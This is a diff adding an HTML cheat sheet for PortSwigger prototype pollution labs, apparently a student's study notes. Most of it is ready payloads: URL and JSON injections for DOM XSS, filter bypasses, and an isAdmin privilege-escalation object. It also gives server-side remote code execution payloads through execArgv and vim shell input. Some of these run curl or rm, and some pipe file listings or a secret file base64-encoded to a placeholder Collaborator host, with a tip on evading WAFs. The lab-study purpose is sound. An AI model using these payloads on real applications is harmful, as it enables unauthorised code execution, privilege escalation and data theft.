@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Prototype-Polution</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header id="title-block-header">
+</header>
+<h1 id="prototype-pollution">Prototype Pollution</h1>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><p><a href="#recon">Recon for Prototype Pollution</a></p></li>
+<li><p><a href="#cheat-sheet">Portswigger Labs Cheat Sheet /
+Payloads</a></p></li>
+<li><p>Additional Note: There is a PDF attached in this folder that has
+a walk-through of the complete labs. The document does not need to be
+downloaded, it can be viewed inline in GitHub.</p></li>
+</ul>
+<p><br><br></p>
+<h2 id="recon">Recon</h2>
+<ul>
+<li><p>Links:</p>
+<ul>
+<li><p>https://portswigger.net/web-security/prototype-pollution/client-side</p></li>
+<li><p>https://portswigger.net/web-security/prototype-pollution/server-side</p></li>
+</ul></li>
+</ul>
+<p><br><br></p>
+<h2 id="tools-and-extensions-used">Tools and Extensions Used:</h2>
+<ul>
+<li><p>Server-Side Prototype Pollution Scanner -
+https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8</p></li>
+<li><p>DOM Invader (Client-side Prototype Pollution) -
+https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution</p></li>
+</ul>
+<p><br><br></p>
+<h2 id="cheat-sheet">Cheat Sheet</h2>
+<p><br><br></p>
+<p><strong>Quick Reference:</strong></p>
+<ul>
+<li>Prototype pollution via the URL:</li>
+</ul>
+<pre><code>https://vulnerable-website.com/?__proto__[evilProperty]=payload</code></pre>
+<p><br></p>
+<ul>
+<li>Prototype pollution via JSON input:</li>
+</ul>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;__proto__&quot;</span><span class="fu">:</span> <span class="fu">{</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>        <span class="dt">&quot;evilProperty&quot;</span><span class="fu">:</span> <span class="st">&quot;payload&quot;</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>    <span class="fu">}</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="er">&quot;constructor&quot;:</span> <span class="fu">{</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;prototype&quot;</span><span class="fu">:</span> <span class="fu">{</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>        <span class="dt">&quot;evilProperty&quot;</span><span class="fu">:</span> <span class="st">&quot;payload&quot;</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>    <span class="fu">}</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<p><br><br></p>
+<h3 id="client-side-pollution-examples">Client Side Pollution
+Examples</h3>
+<ul>
+<li>Use DOM Invader to help with the exploitation process -
+https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution</li>
+</ul>
+<p><br></p>
+<h3 id="client-side-prototype-pollution---dom-xss"><strong>Client-side
+Prototype Pollution - DOM XSS</strong></h3>
+<ul>
+<li><p>Identify a prototype pollution source:</p>
+<ul>
+<li><p>Inject an arbitrary property via a query string and determine if
+it has polluted the Object prototype:</p>
+<ul>
+<li><p>/?__proto__.foo=bar</p></li>
+<li><p>/?__proto__[foo]=bar</p></li>
+</ul></li>
+<li><p>Type the following in the browser’s console and see if the Object
+has been polluted:</p>
+<ul>
+<li>Object.prototype</li>
+</ul></li>
+</ul></li>
+<li><p>Identify a gadget:</p>
+<ul>
+<li>Look through the clients-side source code and identify if there is
+an Object using a property in an insecure way. For example, if we
+identify an object (config) using a property (transport_url) that is not
+defined, and used in a dangerous sink, we can try to pollute that
+property in the Object prototype:</li>
+</ul>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(config<span class="op">.</span><span class="at">transport_url</span>) { </span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="kw">let</span> script <span class="op">=</span> <span class="bu">document</span><span class="op">.</span><span class="fu">createElement</span>(<span class="st">&#39;script&#39;</span>)<span class="op">;</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>script<span class="op">.</span><span class="at">src</span> <span class="op">=</span> config<span class="op">.</span><span class="at">transport_url</span><span class="op">;</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="bu">document</span><span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="fu">appendChild</span>(script)<span class="op">;</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div></li>
+<li><p>Craft an Exploit:</p>
+<ul>
+<li><p>Use the source identified in the first step and attempt to
+pollute the “transport_url” property:</p>
+<ul>
+<li><p>/?__proto__.transport_url=data:,alert(1);</p></li>
+<li><p>/?__proto__[transport_url]=data:,alert(1);</p></li>
+</ul></li>
+</ul></li>
+<li><p>Other scenarios:</p>
+<ul>
+<li>The client-side code may have some extra protections that are
+flawed, such as removing key words but not doing it recursively.</li>
+</ul></li>
+<li><p>Payloads to bypass this validation:</p>
+<ul>
+<li><p>/?__pro__proto__to__[transport_url]=data:,alert(1);</p></li>
+<li><p>/?__pro__proto__to__.transport_url=data:,alert(1);</p></li>
+<li><p>/?constconstructorructor.[protoprototypetype][transport_url]=data:,alert(1);</p></li>
+<li><p>/?constconstructorructor.protoprototypetype.transport_url=data:,alert(1);</p></li>
+</ul></li>
+<li><p>Another scenario:</p>
+<ul>
+<li><p>The application is using the user input within an eval()
+function. To trigger an XSS vulnerability it is required “break” out of
+the context (use hyphens):</p>
+<ul>
+<li>Example Payload: ?__proto__.sequence=-alert(1)-</li>
+</ul></li>
+</ul></li>
+</ul>
+<p><br><br></p>
+<h3
+id="client-side-prototype-pollution---third-party-libraries"><strong>Client-side
+Prototype Pollution - Third-party Libraries</strong></h3>
+<ul>
+<li><p>Use DOM Invader to exploit these scenarios as it will save a lot
+of time.</p></li>
+<li><p>DOM Invader is pretty straight forward to use.</p></li>
+<li><p>Look at the solution for the following lab to learn more about it
+-
+https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries</p></li>
+</ul>
+<p><br><br></p>
+<h3
+id="client-side-prototype-pollution---browser-apis"><strong>Client-side
+Prototype Pollution - Browser APIs</strong></h3>
+<ul>
+<li><p>Identify a prototype pollution source:</p>
+<ul>
+<li><p>Inject an arbitrary property via a query string and determine if
+it has polluted the Object prototype.</p>
+<ul>
+<li><p>/?__proto__.foo=bar</p></li>
+<li><p>/?__proto__[foo]=bar</p></li>
+</ul></li>
+<li><p>Type the following in the browser’s console and see if the Object
+has been polluted:</p>
+<ul>
+<li>Object.prototype</li>
+</ul></li>
+</ul></li>
+<li><p>Identify a gadget:</p>
+<ul>
+<li><p>Look through the clients-side source code and identify if there
+is an Object using a property in an insecure way.</p></li>
+<li><p>For example, the code is using the method Object.defineProperty()
+to define the property “transport_url”, however, the “value” descriptor
+which is used to define the value associated with the property is not
+being defined:</p></li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="bu">Object</span><span class="op">.</span><span class="fu">defineProperty</span>(config<span class="op">,</span> <span class="st">&#39;transport_url&#39;</span><span class="op">,</span> {</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">configurable</span><span class="op">:</span> <span class="kw">false</span><span class="op">,</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">writable</span><span class="op">:</span> <span class="kw">false</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>    <span class="co">// missing -&gt; value: &quot;test&quot;</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+<ul>
+<li><p>The “config” Object is not defining the “value” descriptor for
+“transport_url” property, we can try to pollute the Object prototype
+with the “value” property containing a malicious payload.</p></li>
+<li><p>https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty</p></li>
+<li><p>Craft an exploit:</p>
+<ul>
+<li><p>/?__proto__[value]=data:,alert(1);</p></li>
+<li><p>/?__proto__.value=data:,alert(1);</p></li>
+</ul></li>
+</ul>
+<p><br><br><br></p>
+<h3 id="server-side-pollution-examples">Server Side Pollution
+Examples</h3>
+<ul>
+<li>Use the Burp Extension for help with the exploitation process -
+https://github.com/portswigger/server-side-prototype-pollution</li>
+</ul>
+<p><br></p>
+<h3
+id="server-side-prototype-pollution---privilege-escalation"><strong>Server-side
+Prototype Pollution - Privilege Escalation</strong></h3>
+<ul>
+<li><p>Identify functionality on the application where JSON data is
+returned in a response that appears to represent your “User” Object.</p>
+<ul>
+<li>Example response:</li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&quot;username&quot;</span><span class="fu">:</span><span class="st">&quot;test&quot;</span><span class="fu">,</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&quot;firstname&quot;</span><span class="fu">:</span><span class="st">&quot;test&quot;</span><span class="fu">,</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="dt">&quot;isAdmin&quot;</span><span class="fu">:</span><span class="kw">false</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<ul>
+<li><p>Identify a prototype pollution source:</p>
+<ul>
+<li><p>In the request body, add a new property to the JSON with the name
+__proto__, containing an object with an arbitrary property:</p></li>
+<li><p>Example payload:</p></li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="er">&quot;__proto__&quot;:</span> <span class="fu">{</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;foo&quot;</span><span class="fu">:</span><span class="st">&quot;bar&quot;</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<ul>
+<li><p>If in the response you see the “foo” property added, without the
+“__proto__” property, this suggests that we may have polluted the
+Object’s prototype and that the “foo” property has been inherited via
+prototype chain.</p></li>
+<li><p>Identify a gadget:</p>
+<ul>
+<li>The “isAdmin” property would be something to target for privilege
+escalation.</li>
+</ul></li>
+<li><p>Craft an Exploit:</p>
+<ul>
+<li>Example payload:</li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="er">&quot;__proto__&quot;:</span> <span class="fu">{</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;isAdmin&quot;</span><span class="fu">:</span><span class="kw">true</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<ul>
+<li><p>In the response, if you see the following it suggests that the
+“User” object did not have its own “isAdmin“ property, and instead
+inherited from the polluted prototype.</p>
+<ul>
+<li>Example response:</li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&quot;username&quot;</span><span class="fu">:</span><span class="st">&quot;test&quot;</span><span class="fu">,</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&quot;firstname&quot;</span><span class="fu">:</span><span class="st">&quot;test&quot;</span><span class="fu">,</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="dt">&quot;isAdmin&quot;</span><span class="fu">:</span><span class="kw">true</span></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<ul>
+<li><p>Other scenarios:</p>
+<ul>
+<li>The application may be performing some filtering on the input, one
+way to bypass it is by using the constructor:</li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="er">&quot;constructor&quot;:</span> <span class="fu">{</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;prototype&quot;</span><span class="fu">:</span> <span class="fu">{</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>        <span class="dt">&quot;isAdmin&quot;</span><span class="fu">:</span><span class="kw">true</span></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>    <span class="fu">}</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<p><br><br></p>
+<h3
+id="detecting-prototype-pollution-without-polluted-property-reflection"><strong>Detecting
+Prototype Pollution without Polluted Property Reflection</strong></h3>
+<ul>
+<li><p>There are 3 main techniques:</p>
+<ul>
+<li><p>Status code override</p></li>
+<li><p>JSON spaces override</p></li>
+<li><p>Charset override</p></li>
+</ul></li>
+<li><p>https://portswigger.net/web-security/prototype-pollution/server-side#detecting-server-side-prototype-pollution-without-polluted-property-reflection</p></li>
+<li><p>Identify prototype pollution source:</p>
+<ul>
+<li>JSON spaces technique:</li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="er">&quot;__proto__&quot;:</span><span class="fu">{</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;json spaces&quot;</span><span class="fu">:</span><span class="dv">10</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<ul>
+<li><p>If the prototype pollution payload was successful, you can see a
+notable difference in the response, while not breaking the application’s
+functionality.</p></li>
+<li><p>Burp Suite has an extension that can help to identify server-side
+prototype pollution:</p>
+<ul>
+<li>Server-Side Prototype Pollution Scanner -
+https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8</li>
+</ul></li>
+</ul>
+<p><br><br></p>
+<h3
+id="server-side-prototype-pollution---remote-code-execution-and-exfiltrate-sensitive-data"><strong>Server-side
+Prototype Pollution - Remote Code Execution and Exfiltrate Sensitive
+Data</strong></h3>
+<ul>
+<li>Payloads: (Inject these in JSON Body of HTTP requests)</li>
+</ul>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="er">&quot;__proto__&quot;:</span> <span class="fu">{</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;execArgv&quot;</span><span class="fu">:</span><span class="ot">[</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;--eval=require(&#39;child_process&#39;).execSync(&#39;curl https://YOUR-COLLABORATOR-ID.oastify.com&#39;)&quot;</span></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>    <span class="ot">]</span></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<div class="sourceCode" id="cb13"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="er">&quot;__proto__&quot;:</span> <span class="fu">{</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;execArgv&quot;</span><span class="fu">:</span><span class="ot">[</span></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;--eval=require(&#39;child_process&#39;).execSync(&#39;rm /home/carlos/morale.txt&#39;)&quot;</span></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a>    <span class="ot">]</span></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<p><br></p>
+<ul>
+<li>“Vim has an interactive prompt and expects the user to hit Enter to
+run the provided command. As a result, you need to simulate this by
+including a newline () character at the end of your payload, as shown in
+the examples.”</li>
+</ul>
+<div class="sourceCode" id="cb14"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="er">&quot;shell&quot;:&quot;vim&quot;,</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="er">&quot;input&quot;:&quot;:!</span> <span class="er">&lt;command&gt;\n&quot;</span></span></code></pre></div>
+<div class="sourceCode" id="cb15"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="er">&quot;__proto__&quot;:</span> <span class="fu">{</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;shell&quot;</span><span class="fu">:</span><span class="st">&quot;vim&quot;</span><span class="fu">,</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;input&quot;</span><span class="fu">:</span><span class="st">&quot;:! curl https://YOUR-COLLABORATOR-ID.oastify.com</span><span class="ch">\n</span><span class="st">&quot;</span></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<p><br></p>
+<ul>
+<li>Exfiltrate data to Burp Collab:</li>
+</ul>
+<div class="sourceCode" id="cb16"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="er">&quot;__proto__&quot;:</span> <span class="fu">{</span></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;shell&quot;</span><span class="fu">:</span><span class="st">&quot;vim&quot;</span><span class="fu">,</span></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;input&quot;</span><span class="fu">:</span><span class="st">&quot;:! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com</span><span class="ch">\n</span><span class="st">&quot;</span></span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<div class="sourceCode" id="cb17"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="er">&quot;__proto__&quot;:</span> <span class="fu">{</span></span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;shell&quot;</span><span class="fu">:</span><span class="st">&quot;vim&quot;</span><span class="fu">,</span></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;input&quot;</span><span class="fu">:</span><span class="st">&quot;:! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com</span><span class="ch">\n</span><span class="st">&quot;</span></span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<p><br></p>
+<ul>
+<li>“The escaped double-quotes in the hostname aren’t strictly
+necessary. However, this can help to reduce false positives by
+obfuscating the hostname to evade WAFs and other systems that scrape for
+hostnames.”</li>
+</ul>
+<div class="sourceCode" id="cb18"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="er">&quot;__proto__&quot;:</span> <span class="fu">{</span></span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;shell&quot;</span><span class="fu">:</span><span class="st">&quot;node&quot;</span><span class="fu">,</span></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;NODE_OPTIONS&quot;</span><span class="fu">:</span><span class="st">&quot;--inspect=YOUR-COLLABORATOR-ID.oastify.com</span><span class="ch">\&quot;\&quot;</span><span class="st">.oastify</span><span class="ch">\&quot;\&quot;</span><span class="st">.com&quot;</span></span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<p><br><br><br></p>
+<h3
+id="pending-to-complete-labs-that-are-missing-from-cheat-sheet">Pending
+to complete labs that are missing from cheat sheet:</h3>
+<ul>
+<li>All labs in this category are completed and referenced in cheat
+sheet or attached document.</li>
+</ul>
+</body>
+</html>
